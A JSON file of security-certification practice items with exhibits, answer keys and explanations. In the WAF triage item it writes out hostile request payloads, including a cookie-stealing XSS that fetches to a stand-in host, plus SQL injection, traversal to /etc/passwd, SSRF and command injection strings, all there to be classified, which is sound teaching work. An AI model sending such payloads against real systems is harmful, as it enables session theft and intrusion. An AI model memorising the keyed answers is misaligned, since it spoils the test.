@@ -1,0 +1,805 @@
+[
+ {
+  "id": "xg-pbq-d1-ztna",
+  "type": "match",
+  "t": "Zero trust",
+  "title": "Zero trust access decisions",
+  "prompt": "A hospital rolled out zero trust access to its EHR. Using the policy and log in the exhibit, identify the component behind each log line, then choose the outcome for each access request.",
+  "exhibit": "POLICY  ehr-clinical\n  allow if  group=Clinicians AND device.managed AND device.compliant\n  step-up   if  location.new_country OR risk>=60   -> require FIDO2\n  read-only if  device.managed=false               -> view only, no export\n  deny      otherwise\n\nLOG\n10:02  [A] evaluated request user=dr.lin device=MBP-221 risk=12  -> allow\n10:02  [B] created session token for dr.lin -> EHR, scope=clinical\n10:02  [C] gateway admitted TLS session 10.4.1.7 -> ehr.internal:443\n10:15  [A] evaluated request user=n.ortiz device=personal-iPad risk=20 -> read-only",
+  "choices": [
+   "Policy engine",
+   "Policy administrator",
+   "Policy enforcement point",
+   "Subject",
+   "Implicit trust zone",
+   "Threat intelligence feed"
+  ],
+  "rows": [
+   {
+    "label": "[A] evaluated the request against the policy",
+    "a": "Policy engine"
+   },
+   {
+    "label": "[B] created the session token",
+    "a": "Policy administrator"
+   },
+   {
+    "label": "[C] admitted the TLS session in the traffic path",
+    "a": "Policy enforcement point"
+   },
+   {
+    "label": "dr.lin on MBP-221",
+    "a": "Subject"
+   },
+   {
+    "label": "Request: Clinician, managed and compliant laptop, usual city, risk 25",
+    "a": "Allow",
+    "choices": [
+     "Allow",
+     "Require FIDO2 step-up",
+     "Read-only access",
+     "Deny"
+    ]
+   },
+   {
+    "label": "Request: Clinician, managed and compliant laptop, first login from a new country",
+    "a": "Require FIDO2 step-up",
+    "choices": [
+     "Allow",
+     "Require FIDO2 step-up",
+     "Read-only access",
+     "Deny"
+    ]
+   },
+   {
+    "label": "Request: Clinician on a personal tablet, usual city, risk 20",
+    "a": "Read-only access",
+    "choices": [
+     "Allow",
+     "Require FIDO2 step-up",
+     "Read-only access",
+     "Deny"
+    ]
+   },
+   {
+    "label": "Request: Billing clerk (not in Clinicians) on a managed, compliant laptop",
+    "a": "Deny",
+    "choices": [
+     "Allow",
+     "Require FIDO2 step-up",
+     "Read-only access",
+     "Deny"
+    ]
+   }
+  ],
+  "why": "The policy engine makes the decision, the policy administrator turns it into a session or token, and the enforcement point in the traffic path admits or blocks the connection. The requester is the subject. Policy order matters: a managed, compliant clinician is allowed, a new country triggers step-up even on a good device, an unmanaged device gets read-only, and anyone outside the Clinicians group falls to deny.",
+  "xg": true
+ },
+ {
+  "id": "xg-pbq-d1-change",
+  "type": "match",
+  "t": "Change management",
+  "title": "Review a change request",
+  "prompt": "You sit on the change advisory board. Review the change request in the exhibit. For each finding, choose the change management element it affects, then decide the request's outcome.",
+  "exhibit": "CHG-4471  Upgrade OpenSSL on payment gateway PG-01 and PG-02\nRequested by: R. Shah     Risk: Medium     Window: Sat 01:00-03:00\nImpact analysis: 'Low impact, library update only.'\nTest results:    (blank)\nBackout plan:    'Restore from backup if needed.'\nDependencies:    (blank)  -- note: POS terminals pin TLS 1.2 ciphers removed in this OpenSSL build\nApprovals:       Network lead (yes), Application owner (not requested)\nRestart needed:  Yes, gateway services (about 4 min each)\nDocs to update:  (blank)",
+  "choices": [
+   "Impact analysis",
+   "Test results",
+   "Backout plan",
+   "Dependencies",
+   "Stakeholder approval",
+   "Service restart",
+   "Documentation update",
+   "Maintenance window"
+  ],
+  "rows": [
+   {
+    "label": "'Low impact' ignores that POS terminals rely on the removed ciphers",
+    "a": "Impact analysis"
+   },
+   {
+    "label": "No evidence the build was tried in staging with POS traffic",
+    "a": "Test results"
+   },
+   {
+    "label": "'Restore from backup if needed' has no steps, owner, or time estimate",
+    "a": "Backout plan"
+   },
+   {
+    "label": "POS terminals' cipher pinning isn't listed",
+    "a": "Dependencies"
+   },
+   {
+    "label": "The payment application's owner never signed off",
+    "a": "Stakeholder approval"
+   },
+   {
+    "label": "Both gateways restart; payments pause unless the restarts are staggered",
+    "a": "Service restart"
+   },
+   {
+    "label": "Best CAB decision",
+    "a": "Return for rework: add testing, dependency, and owner sign-off",
+    "choices": [
+     "Approve as written",
+     "Approve but skip the backout plan",
+     "Return for rework: add testing, dependency, and owner sign-off",
+     "Reject permanently"
+    ]
+   }
+  ],
+  "why": "The request understates impact because of an unlisted dependency, has no test evidence, gives a vague backout, lacks the application owner's approval, and doesn't plan for the restart. The window is fine, and documentation updates follow implementation, so they aren't the blockers here. The right outcome is to send it back for rework, not approve it or kill a needed security update.",
+  "xg": true
+ },
+ {
+  "id": "xg-pbq-d2-web",
+  "type": "match",
+  "t": "Web attacks",
+  "title": "Triage the WAF log",
+  "prompt": "A WAF in monitor mode logged the requests in the exhibit against a retailer's web app. Classify each request (not every category is used), then choose the root-cause fix for the two that were confirmed exploitable.",
+  "exhibit": "#1  GET  /search?q=%3Cimg%20src%3Dx%20onerror%3Dfetch('//x.io/'%2Bdocument.cookie)%3E\n#2  GET  /orders?id=8812%20AND%20SLEEP(7)--          (response 7,140 ms)\n#3  GET  /static/..%252f..%252f..%252fetc%252fpasswd\n#4  POST /api/preview   url=http://169.254.169.254/latest/meta-data/\n#5  POST /tools/dns     host=example.com%3Bid\n#6  GET  /products?page=3&sort=price\n#7  PATCH /api/me       {\"name\":\"Ana\",\"isAdmin\":true}",
+  "choices": [
+   "Cross-site scripting",
+   "SQL injection",
+   "Directory traversal",
+   "Server-side request forgery",
+   "Command injection",
+   "Privilege escalation via mass assignment",
+   "Cross-site request forgery",
+   "Replay attack",
+   "Benign"
+  ],
+  "rows": [
+   {
+    "label": "#1",
+    "a": "Cross-site scripting"
+   },
+   {
+    "label": "#2",
+    "a": "SQL injection"
+   },
+   {
+    "label": "#3",
+    "a": "Directory traversal"
+   },
+   {
+    "label": "#4",
+    "a": "Server-side request forgery"
+   },
+   {
+    "label": "#5",
+    "a": "Command injection"
+   },
+   {
+    "label": "#6",
+    "a": "Benign"
+   },
+   {
+    "label": "#7",
+    "a": "Privilege escalation via mass assignment"
+   },
+   {
+    "label": "Fix for #2 (confirmed)",
+    "a": "Parameterized queries",
+    "choices": [
+     "Parameterized queries",
+     "Output encoding",
+     "Switch the WAF to blocking only",
+     "Rate limiting on /orders"
+    ]
+   },
+   {
+    "label": "Fix for #4 (confirmed)",
+    "a": "Allow-list destinations and block internal ranges",
+    "choices": [
+     "Allow-list destinations and block internal ranges",
+     "Anti-CSRF tokens on the form",
+     "Encode the url parameter in responses",
+     "Require TLS 1.3 for the API"
+    ]
+   }
+  ],
+  "why": "#1 is an encoded img/onerror payload stealing cookies (XSS). #2's 7-second delay proves time-based SQL injection. #3 double-encodes ../ to reach /etc/passwd (traversal). #4 makes the server fetch the cloud metadata address (SSRF). #5's %3B is ';' chaining a shell command (command injection). #6 is normal paging. #7 sets a privileged field the server should never accept (mass assignment). CSRF and replay don't appear. Root fixes: parameterized queries for SQLi and destination allow-listing for SSRF; a WAF is a compensating layer, not the fix.",
+  "xg": true
+ },
+ {
+  "id": "xg-pbq-d2-social",
+  "type": "match",
+  "t": "Social engineering",
+  "title": "Classify the reported events",
+  "prompt": "The security team at a credit union received the reports in the exhibit this week. Identify the MOST specific technique for each report (not every option is used), then choose the best response for the two highlighted reports.",
+  "exhibit": "R1  Text: 'Your debit card is frozen. Verify at example-cu-secure.com' (real site: example-cu.org)\nR2  Caller claims to be from the core banking vendor, cites last night's real outage ticket, asks a teller for her MFA code\nR3  Email to the CFO only, referencing the board meeting date, linking to a fake board portal\nR4  A man in a courier vest follows staff through the badge door carrying boxes\nR5  The vendor's real mailbox replies in an existing thread asking to change remittance details\nR6  A social account using the credit union's logo answers members' complaints and links to a login page\nR7  QR code on a flyer in the branch lobby offering a 'member rewards' signup",
+  "choices": [
+   "Smishing",
+   "Pretexting",
+   "Whaling",
+   "Tailgating",
+   "Business email compromise",
+   "Brand impersonation",
+   "Image-based phishing",
+   "Watering hole",
+   "Typosquatting only"
+  ],
+  "rows": [
+   {
+    "label": "R1",
+    "a": "Smishing"
+   },
+   {
+    "label": "R2",
+    "a": "Pretexting"
+   },
+   {
+    "label": "R3",
+    "a": "Whaling"
+   },
+   {
+    "label": "R4",
+    "a": "Tailgating"
+   },
+   {
+    "label": "R5",
+    "a": "Business email compromise"
+   },
+   {
+    "label": "R6",
+    "a": "Brand impersonation"
+   },
+   {
+    "label": "R7",
+    "a": "Image-based phishing"
+   },
+   {
+    "label": "Best response to R5",
+    "a": "Call the vendor at the number on file before changing anything",
+    "choices": [
+     "Call the vendor at the number on file before changing anything",
+     "Reply in the thread asking the vendor to confirm",
+     "Make the change, because SPF and DKIM passed",
+     "Block the vendor's domain at the email gateway"
+    ]
+   },
+   {
+    "label": "Best response to R2",
+    "a": "Refuse, then verify through the vendor's known support line",
+    "choices": [
+     "Refuse, then verify through the vendor's known support line",
+     "Give the code, since the ticket number was correct",
+     "Ask the caller for their employee ID and continue",
+     "Transfer the caller to a manager to approve"
+    ]
+   }
+  ],
+  "why": "R1 is phishing by SMS that uses a lookalike domain; the MOST specific technique for the message is smishing. R2's believable story built on a real event is pretexting. R3 targets an executive (whaling). R4 is tailgating. R5 comes from the vendor's real, compromised mailbox (BEC), so authentication passing proves nothing; verify by calling a number you already have. R6 poses as the brand's support. R7 hides the link in a QR image. For R2, never share MFA codes and verify through a channel you choose.",
+  "xg": true
+ },
+ {
+  "id": "xg-pbq-d3-cloud",
+  "type": "match",
+  "t": "Cloud & virtualization",
+  "title": "Fix the cloud posture findings",
+  "prompt": "A cloud security posture tool produced the findings in the exhibit for a retailer's production account. Choose the BEST remediation for each finding (not every option is used), then answer the two follow-up questions.",
+  "exhibit": "F1  Bucket 'cust-exports' policy: Principal '*' allows s3:GetObject\nF2  Security group sg-db allows tcp/3306 from 0.0.0.0/0\nF3  IAM user 'ci-deploy' has a static access key created 412 days ago, used from a laptop\nF4  CloudTrail logging disabled in two regions\nF5  Role 'img-resizer' policy: Action s3:*, Resource *\nF6  Root account has no MFA\nF7  EBS volumes for 'payroll-db' unencrypted",
+  "choices": [
+   "Remove public principal access and enable block-public-access",
+   "Restrict the rule to the app tier's security group",
+   "Replace the key with a short-lived role for the pipeline",
+   "Enable logging in all regions to a protected central bucket",
+   "Scope the policy to the needed actions and buckets",
+   "Enable MFA on the root account and lock its credentials away",
+   "Encrypt the volumes with a managed KMS key",
+   "Delete the bucket and recreate it in another region",
+   "Open a ticket with the provider to fix it for you"
+  ],
+  "rows": [
+   {
+    "label": "F1",
+    "a": "Remove public principal access and enable block-public-access"
+   },
+   {
+    "label": "F2",
+    "a": "Restrict the rule to the app tier's security group"
+   },
+   {
+    "label": "F3",
+    "a": "Replace the key with a short-lived role for the pipeline"
+   },
+   {
+    "label": "F4",
+    "a": "Enable logging in all regions to a protected central bucket"
+   },
+   {
+    "label": "F5",
+    "a": "Scope the policy to the needed actions and buckets"
+   },
+   {
+    "label": "F6",
+    "a": "Enable MFA on the root account and lock its credentials away"
+   },
+   {
+    "label": "F7",
+    "a": "Encrypt the volumes with a managed KMS key"
+   },
+   {
+    "label": "Which finding should be fixed FIRST?",
+    "a": "F1, because customer data is publicly readable now",
+    "choices": [
+     "F1, because customer data is publicly readable now",
+     "F4, because logging gaps hide everything else",
+     "F7, because unencrypted volumes are the most common breach cause",
+     "F3, because the key is over a year old"
+    ]
+   },
+   {
+    "label": "Under the shared responsibility model, who owns these fixes?",
+    "a": "The customer",
+    "choices": [
+     "The customer",
+     "The cloud provider",
+     "Split evenly between both",
+     "Whoever the auditor assigns"
+    ]
+   }
+  ],
+  "why": "Each fix targets the specific misconfiguration: remove public access, scope network rules to the tier that needs them, swap long-lived keys for short-lived roles, log every region centrally, apply least privilege, protect root with MFA, and encrypt at rest. Customer data that is publicly readable right now is the most urgent exposure. Configuration of identities, network rules, logging, and data is always the customer's responsibility. Deleting buckets or asking the provider fixes nothing.",
+  "xg": true
+ },
+ {
+  "id": "xg-pbq-d3-dr",
+  "type": "match",
+  "t": "Resilience",
+  "title": "Design the recovery strategy",
+  "prompt": "Using the business impact analysis in the exhibit, choose the recovery site and the data protection method for each system, then answer the final two questions. Choose the LEAST costly option that still meets each objective.",
+  "exhibit": "System           RTO        RPO          Notes\nCard processing  15 min     0 (no loss)   Primary and DR sites 40 km apart\nEmail            8 hours    1 hour        SaaS available as an option\nHR records       5 days     24 hours      Low change rate\nMarketing site   2 weeks    1 week        Static content, rebuilt from a repository",
+  "choices": [
+   "Hot site",
+   "Warm site",
+   "Cold site",
+   "Synchronous replication",
+   "Asynchronous replication",
+   "Hourly snapshots or log shipping",
+   "Nightly backups",
+   "Weekly backups"
+  ],
+  "rows": [
+   {
+    "label": "Card processing: site",
+    "a": "Hot site"
+   },
+   {
+    "label": "Card processing: data protection",
+    "a": "Synchronous replication"
+   },
+   {
+    "label": "Email: data protection",
+    "a": "Hourly snapshots or log shipping"
+   },
+   {
+    "label": "HR records: site",
+    "a": "Cold site"
+   },
+   {
+    "label": "HR records: data protection",
+    "a": "Nightly backups"
+   },
+   {
+    "label": "Marketing site: data protection",
+    "a": "Weekly backups"
+   },
+   {
+    "label": "Why is synchronous replication workable for card processing here?",
+    "a": "The sites are only 40 km apart, so the added latency is small",
+    "choices": [
+     "The sites are only 40 km apart, so the added latency is small",
+     "Synchronous replication protects against ransomware",
+     "It costs less than asynchronous replication",
+     "It removes the need for any backups"
+    ]
+   },
+   {
+    "label": "Which test proves the card processing RTO without disrupting customers?",
+    "a": "A scheduled failover test in a maintenance window",
+    "choices": [
+     "A scheduled failover test in a maintenance window",
+     "A tabletop exercise with leadership",
+     "Reviewing the BIA spreadsheet again",
+     "Checking that backup jobs report success"
+    ]
+   }
+  ],
+  "why": "A 15-minute RTO with zero data loss needs a hot site and synchronous replication, which is practical over 40 km because latency grows with distance. A 1-hour RPO for email calls for hourly snapshots or log shipping. HR's 5-day RTO and 24-hour RPO fit a cold site and nightly backups. Marketing's one-week RPO fits weekly backups. Only an actual failover test proves an RTO, and replication still needs backups behind it because it copies corruption and ransomware.",
+  "xg": true
+ },
+ {
+  "id": "xg-pbq-d4-fw",
+  "type": "match",
+  "t": "Firewall rules",
+  "title": "Trace and fix the egress policy",
+  "prompt": "An outbound firewall policy is in the exhibit. Rules are processed top-down and stop at the first match, and there is no rule after rule 6. Part 1: decide what happens to each flow. Part 2: choose the fix for each requirement.",
+  "exhibit": "#  Action  Proto  Source            Destination        Port\n1  PERMIT  TCP    10.20.0.0/16      10.0.0.5 (proxy)   8080\n2  PERMIT  UDP    10.20.0.0/16      10.0.0.53          53\n3  PERMIT  TCP    10.0.0.5          any                80,443\n4  PERMIT  TCP    10.20.0.0/16      any                443\n5  DENY    TCP    10.20.9.0/24      any                any (log)\n6  PERMIT  UDP    10.0.0.53         any                53",
+  "choices": [
+   "Allowed by rule 1",
+   "Allowed by rule 2",
+   "Allowed by rule 3",
+   "Allowed by rule 4",
+   "Denied by rule 5",
+   "Allowed by rule 6",
+   "Denied by implicit deny"
+  ],
+  "rows": [
+   {
+    "label": "10.20.4.8 -> 10.0.0.5 TCP 8080 (browser to proxy)",
+    "a": "Allowed by rule 1"
+   },
+   {
+    "label": "10.20.9.14 -> 52.1.2.3 TCP 443 (kiosk direct to internet)",
+    "a": "Allowed by rule 4"
+   },
+   {
+    "label": "10.20.4.8 -> 45.95.11.8 TCP 8443 (malware C2)",
+    "a": "Denied by implicit deny"
+   },
+   {
+    "label": "10.20.4.8 -> 8.8.8.8 UDP 53 (direct public DNS)",
+    "a": "Denied by implicit deny"
+   },
+   {
+    "label": "10.0.0.53 -> 198.51.100.1 UDP 53 (resolver forwarding)",
+    "a": "Allowed by rule 6"
+   },
+   {
+    "label": "Requirement: kiosks (10.20.9.0/24) must not reach the internet at all",
+    "a": "Move rule 5 above rule 4",
+    "choices": [
+     "Move rule 5 above rule 4",
+     "Delete rule 4",
+     "Change rule 5 to PERMIT",
+     "Add a second copy of rule 5 at the end"
+    ]
+   },
+   {
+    "label": "Requirement: users must browse ONLY through the proxy",
+    "a": "Delete rule 4",
+    "choices": [
+     "Delete rule 4",
+     "Move rule 4 above rule 1",
+     "Change rule 4's port to 8443",
+     "Add logging to rule 4"
+    ]
+   },
+   {
+    "label": "Why add an explicit logged deny-all at the end?",
+    "a": "To log denied traffic; the implicit deny usually doesn't",
+    "choices": [
+     "To log denied traffic; the implicit deny usually doesn't",
+     "Without it, unmatched traffic would be allowed",
+     "Firewalls require an even number of rules",
+     "It speeds up rule processing"
+    ]
+   }
+  ],
+  "why": "Rule 1 allows browsers to reach the proxy. The kiosk's direct HTTPS matches the broad rule 4 before reaching its deny at rule 5, so the deny is shadowed and must move above rule 4. TCP 8443 and direct public DNS match nothing and fall to the implicit deny. The internal resolver may forward DNS through rule 6. Rule 4 lets every client bypass the proxy on 443, so deleting it forces browsing through the proxy, which still has its own rule 3. An explicit deny-all exists mainly to log what gets dropped.",
+  "xg": true
+ },
+ {
+  "id": "xg-pbq-d4-ir",
+  "type": "match",
+  "t": "Incident response",
+  "title": "Run the mailbox compromise response",
+  "prompt": "A finance employee's mailbox was compromised and used for invoice fraud. Using the timeline in the exhibit, identify the incident response phase of each activity, then choose the best action for each decision point.",
+  "exhibit": "Mon 09:10  User reports a vendor asking why payment went to a new bank account\nMon 09:40  Analyst finds a hidden inbox rule forwarding 'invoice' emails to a free webmail address\nMon 09:55  Sign-in logs show the user's session token reused from another country since Friday\nMon 10:05  Team revokes sessions, resets the password, removes the rule\nMon 13:00  OAuth app 'Mail Sync Pro' with Mail.Read found and removed; tenant searched for the same app\nTue 08:00  Mailbox returned to the user with conditional access requiring a compliant device\nFri 15:00  Review leads to a new payment-change callback procedure",
+  "choices": [
+   "Preparation",
+   "Detection",
+   "Analysis",
+   "Containment",
+   "Eradication",
+   "Recovery",
+   "Lessons learned"
+  ],
+  "rows": [
+   {
+    "label": "Mon 09:10 user report",
+    "a": "Detection"
+   },
+   {
+    "label": "Mon 09:40-09:55 rule and sign-in investigation",
+    "a": "Analysis"
+   },
+   {
+    "label": "Mon 10:05 sessions revoked, password reset, rule removed",
+    "a": "Containment"
+   },
+   {
+    "label": "Mon 13:00 malicious OAuth app removed and hunted tenant-wide",
+    "a": "Eradication"
+   },
+   {
+    "label": "Tue 08:00 mailbox returned with conditional access",
+    "a": "Recovery"
+   },
+   {
+    "label": "Fri 15:00 new callback procedure",
+    "a": "Lessons learned"
+   },
+   {
+    "label": "Why revoke sessions instead of only resetting the password?",
+    "a": "Stolen session tokens stay valid after a password reset",
+    "choices": [
+     "Stolen session tokens stay valid after a password reset",
+     "Password resets take 24 hours to apply",
+     "Revoking sessions also removes inbox rules",
+     "Session revocation notifies the vendor automatically"
+    ]
+   },
+   {
+    "label": "Which data source best shows what the attacker read?",
+    "a": "Mailbox audit logs of item access",
+    "choices": [
+     "Mailbox audit logs of item access",
+     "The firewall's NetFlow records",
+     "The user's browser history",
+     "DNS query logs from the resolver"
+    ]
+   }
+  ],
+  "why": "The report is detection, digging into rules and sign-ins is analysis, and revoking sessions and removing the rule contains the attacker. Removing the malicious OAuth app, the persistence that survived the password reset, and hunting for it elsewhere is eradication. Returning the mailbox under stronger controls is recovery, and the new callback procedure is lessons learned. Token theft bypasses passwords, so sessions must be revoked, and mailbox audit logs record which items were accessed.",
+  "xg": true
+ },
+ {
+  "id": "xg-pbq-d4-iam",
+  "type": "match",
+  "t": "IAM",
+  "title": "Design the identity controls",
+  "prompt": "A mid-sized company is fixing identity problems found in an audit. Choose the BEST control for each finding (not every option is used).",
+  "exhibit": "A1  Former employees keep accounts in 40 SaaS apps for weeks after leaving\nA2  Admins hold Domain Admin rights permanently, 24/7\nA3  Users approve rogue OAuth apps that request mailbox access\nA4  Phishing kits relay MFA codes in real time to the real login page\nA5  Help desk resets passwords for anyone who knows an employee's birthday\nA6  A shared 'svc_report' password is in a script on a file share\nA7  Payroll admins can both add employees and approve pay runs",
+  "choices": [
+   "SCIM provisioning from the identity provider",
+   "Just-in-time privileged access through PAM",
+   "Admin consent workflow for third-party apps",
+   "FIDO2 passkeys for sign-in",
+   "Callback and MFA-based identity verification",
+   "Vaulted secret with automatic rotation",
+   "Separation of duties",
+   "Longer password expiration",
+   "Security questions"
+  ],
+  "rows": [
+   {
+    "label": "A1",
+    "a": "SCIM provisioning from the identity provider"
+   },
+   {
+    "label": "A2",
+    "a": "Just-in-time privileged access through PAM"
+   },
+   {
+    "label": "A3",
+    "a": "Admin consent workflow for third-party apps"
+   },
+   {
+    "label": "A4",
+    "a": "FIDO2 passkeys for sign-in"
+   },
+   {
+    "label": "A5",
+    "a": "Callback and MFA-based identity verification"
+   },
+   {
+    "label": "A6",
+    "a": "Vaulted secret with automatic rotation"
+   },
+   {
+    "label": "A7",
+    "a": "Separation of duties"
+   }
+  ],
+  "why": "SCIM ties app accounts to the identity provider's lifecycle, and JIT access removes standing admin rights. Admin consent stops users from granting rogue apps access, and FIDO2 is the phishing-resistant answer to relayed codes. Help desk resets need verification an attacker can't look up. Secrets in scripts belong in a vault with rotation, and adding employees and approving pay must be split between people. Longer expiration and security questions don't fix any of these.",
+  "xg": true
+ },
+ {
+  "id": "xg-pbq-d4-email",
+  "type": "match",
+  "t": "DNS & email security",
+  "title": "Repair the email authentication records",
+  "prompt": "A company's email authentication is failing. Review the DNS records and receiver results in the exhibit, identify each problem, then choose the correct fix.",
+  "exhibit": "company.com.            TXT  \"v=spf1 include:_spf.google.com include:sendgrid.net include:mailgun.org include:spf.protection.outlook.com include:servers.mcsv.net include:mktomail.com mx a ?all\"\n_dmarc.company.com.     TXT  \"v=DMARC1; p=none; rua=mailto:dmarc@company.com\"\ns1._domainkey.company.com  (no record)\nparked-company.net      (no SPF, no DMARC)\n\nReceiver results:\n  newsletters via SendGrid: spf=permerror  dkim=pass header.d=sendgrid.net  dmarc=fail\n  spoofed mail claiming company.com: delivered to inboxes\n  invoices spoofed from parked-company.net: delivered",
+  "choices": [
+   "Too many DNS lookups in SPF",
+   "SPF qualifier ?all is neutral, so failures are ignored",
+   "DMARC policy is monitor-only",
+   "DKIM not aligned with company.com",
+   "Parked domain has no sending policy",
+   "MX record points to the wrong server",
+   "DNSSEC not enabled on the zone"
+  ],
+  "rows": [
+   {
+    "label": "Newsletters get spf=permerror",
+    "a": "Too many DNS lookups in SPF"
+   },
+   {
+    "label": "SPF failures would not cause rejection even if fixed",
+    "a": "SPF qualifier ?all is neutral, so failures are ignored"
+   },
+   {
+    "label": "Spoofed company.com mail still reaches inboxes",
+    "a": "DMARC policy is monitor-only"
+   },
+   {
+    "label": "Newsletters fail DMARC even though DKIM passes",
+    "a": "DKIM not aligned with company.com"
+   },
+   {
+    "label": "Invoices spoofed from parked-company.net are delivered",
+    "a": "Parked domain has no sending policy"
+   },
+   {
+    "label": "Correct record for parked-company.net",
+    "a": "v=spf1 -all plus a DMARC p=reject record",
+    "choices": [
+     "v=spf1 -all plus a DMARC p=reject record",
+     "v=spf1 +all plus DMARC p=none",
+     "An MX record pointing to the main mail server",
+     "A DNSSEC DS record at the registrar"
+    ]
+   },
+   {
+    "label": "Correct next step for DMARC once alignment is fixed",
+    "a": "Move from p=none to p=quarantine, then p=reject",
+    "choices": [
+     "Move from p=none to p=quarantine, then p=reject",
+     "Delete the DMARC record entirely",
+     "Keep p=none permanently to avoid issues",
+     "Add a second DMARC record with p=reject"
+    ]
+   }
+  ],
+  "why": "Seven includes plus mx and a push SPF past 10 lookups (permerror), and ?all is neutral, so even a fixed SPF wouldn't fail spoofed mail. DMARC at p=none only reports. SendGrid signs with its own domain, so DKIM passes but isn't aligned; it needs a company.com DKIM key (the missing s1 selector). Parked domains should publish -all and DMARC reject. Tighten DMARC in stages once legitimate mail aligns. A domain can have only one DMARC record, and MX and DNSSEC don't solve these problems.",
+  "xg": true
+ },
+ {
+  "id": "xg-pbq-d5-risk",
+  "type": "match",
+  "t": "Risk",
+  "title": "Complete the risk register",
+  "prompt": "The board's appetite statement: 'Treat any risk whose ALE exceeds $50,000; transfer or mitigate when the treatment costs less than the ALE it removes; never accept a risk that could halt patient care.' Calculate the missing values, then choose the BEST response for each risk (not every option is used).",
+  "exhibit": "Risk  Description                              AV           EF     ARO    Option and annual cost\nA     Ransomware on clinical systems          $3,000,000   40%    0.25   EDR + immutable backups: $90,000, cuts ARO to 0.05\nB     Theft of encrypted laptops              $2,500       100%   12     (no treatment proposed)\nC     Legacy fax server used by one clinic    -            -      -      Retire it; clinic switches to secure e-fax\nD     Third-party billing outage              $400,000     50%    0.5    Business interruption insurance: $30,000\nE     Website defacement                      $20,000      50%    1      WAF service: $45,000",
+  "choices": [
+   "Accept",
+   "Avoid",
+   "Mitigate",
+   "Transfer"
+  ],
+  "rows": [
+   {
+    "label": "Risk A: SLE",
+    "a": "$1,200,000",
+    "choices": [
+     "$1,200,000",
+     "$300,000",
+     "$750,000",
+     "$3,000,000"
+    ]
+   },
+   {
+    "label": "Risk A: ALE before treatment",
+    "a": "$300,000",
+    "choices": [
+     "$300,000",
+     "$1,200,000",
+     "$60,000",
+     "$750,000"
+    ]
+   },
+   {
+    "label": "Risk A: annual value of the treatment",
+    "a": "$150,000",
+    "choices": [
+     "$150,000",
+     "$240,000",
+     "$300,000",
+     "-$30,000"
+    ]
+   },
+   {
+    "label": "Risk B: ALE",
+    "a": "$30,000",
+    "choices": [
+     "$30,000",
+     "$2,500",
+     "$12,000",
+     "$300,000"
+    ]
+   },
+   {
+    "label": "Risk A response",
+    "a": "Mitigate"
+   },
+   {
+    "label": "Risk B response",
+    "a": "Accept"
+   },
+   {
+    "label": "Risk C response",
+    "a": "Avoid"
+   },
+   {
+    "label": "Risk D response (ALE $100,000)",
+    "a": "Transfer"
+   },
+   {
+    "label": "Risk E response",
+    "a": "Accept"
+   }
+  ],
+  "why": "A: SLE = $3,000,000 × 0.40 = $1,200,000, ALE = × 0.25 = $300,000; after treatment ALE = $60,000, so the treatment removes $240,000 for $90,000, a $150,000 net value: mitigate. B: $2,500 × 12 = $30,000, below the $50,000 treatment threshold and already encrypted: accept. C: retiring the legacy system removes the risk entirely: avoid. D: ALE = $200,000 × 0.5 = $100,000, and $30,000 of insurance covers it cheaply: transfer. E: ALE is $10,000 and the fix costs $45,000: accept.",
+  "xg": true
+ },
+ {
+  "id": "xg-pbq-d5-vendor",
+  "type": "match",
+  "t": "Vendor management",
+  "title": "Assess a new vendor",
+  "prompt": "A hospital is onboarding a cloud transcription vendor. Review the evidence in the exhibit. For each item, choose what it is or what it shows (not every option is used), then make the two decisions.",
+  "exhibit": "E1  SOC 2 Type II report, period Jan 1 - Jun 30; today is Nov 18\nE2  Letter from vendor: 'no material control changes since June 30'\nE3  Vendor questionnaire: 'All admin access requires MFA'\nE4  Independent pen test summary (Aug): 'Admin portal accepts password only'\nE5  Vendor stores audio backups with 'StorCo', a provider the hospital hasn't reviewed\nE6  Draft contract: breach notice 'within a reasonable time'; no audit rights",
+  "choices": [
+   "Independent assessment",
+   "Bridge letter",
+   "Self-reported claim",
+   "Contradicting evidence",
+   "Fourth-party risk",
+   "Weak contract terms",
+   "Concentration risk",
+   "Right-to-audit clause"
+  ],
+  "rows": [
+   {
+    "label": "E1",
+    "a": "Independent assessment"
+   },
+   {
+    "label": "E2",
+    "a": "Bridge letter"
+   },
+   {
+    "label": "E3",
+    "a": "Self-reported claim"
+   },
+   {
+    "label": "E4",
+    "a": "Contradicting evidence"
+   },
+   {
+    "label": "E5",
+    "a": "Fourth-party risk"
+   },
+   {
+    "label": "E6",
+    "a": "Weak contract terms"
+   },
+   {
+    "label": "Best contract fix for E6",
+    "a": "72-hour breach notification and a right-to-audit clause",
+    "choices": [
+     "72-hour breach notification and a right-to-audit clause",
+     "A longer contract term with a price discount",
+     "An NDA covering the hospital's own policies",
+     "A clause letting the vendor list the hospital as a client"
+    ]
+   },
+   {
+    "label": "Best onboarding decision",
+    "a": "Proceed only after the MFA gap is fixed and StorCo is reviewed",
+    "choices": [
+     "Proceed only after the MFA gap is fixed and StorCo is reviewed",
+     "Sign now, because the SOC 2 report is clean",
+     "Reject permanently because of one pen test finding",
+     "Sign now and review the vendor next year"
+    ]
+   }
+  ],
+  "why": "E1 is independent evidence, and E2 bridges the gap since the report period ended. E3 is the vendor's own claim, and E4, independent evidence, contradicts it. E5 is a fourth party holding the hospital's data, and E6's vague notice and lack of audit rights are weak terms; fix them with a defined notification window and a right to audit. The sound decision is conditional approval: resolve the contradiction and review the fourth party, rather than signing blindly or rejecting a fixable vendor.",
+  "xg": true
+ }
+]
